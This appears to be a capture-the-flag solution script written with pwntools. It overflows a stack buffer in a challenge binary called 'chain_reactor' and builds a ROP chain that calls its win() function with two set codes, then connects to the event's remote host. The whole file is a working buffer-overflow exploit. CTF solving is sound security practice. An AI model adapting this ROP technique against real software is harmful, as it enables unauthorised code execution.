#!/usr/bin/env python3
from pwn import *
"""
The idea is simply to create a ROPchain that call call void win(unsigned long code1, unsigned long code2) and putting in code1=0xc0ffee and in code2=0xbadc0de

"""
context.binary = elf = ELF('./chain_reactor', checksec=False)

context.arch = 'amd64'

OFFSET_TO_RIP = 72
rop=ROP(elf)

a = 0xc0ffee# == 0xc0ffeeULL
b = 0xbadc0de# == 0xbadc0deULL

RET= rop.find_gadget(['ret'])[0]
POP_RDI   = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI   = rop.find_gadget(['pop rsi', 'ret'])[0]
WIN      = elf.sym['win'] #0x401226

#p = process(elf.path)
HOST,PORT="offsec.m0lecon.it",13599
p=remote(HOST,PORT)
p.recvuntil(b'codes: ')

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),               #stack alignment
    p64(POP_RDI), p64(a),   #put into code1 the value 0xc0ffee
    p64(POP_RSI), p64(b),   #put into code2 the value 0xbadc0de
    p64(elf.sym.win),
)


p.send(payload)
p.interactive()
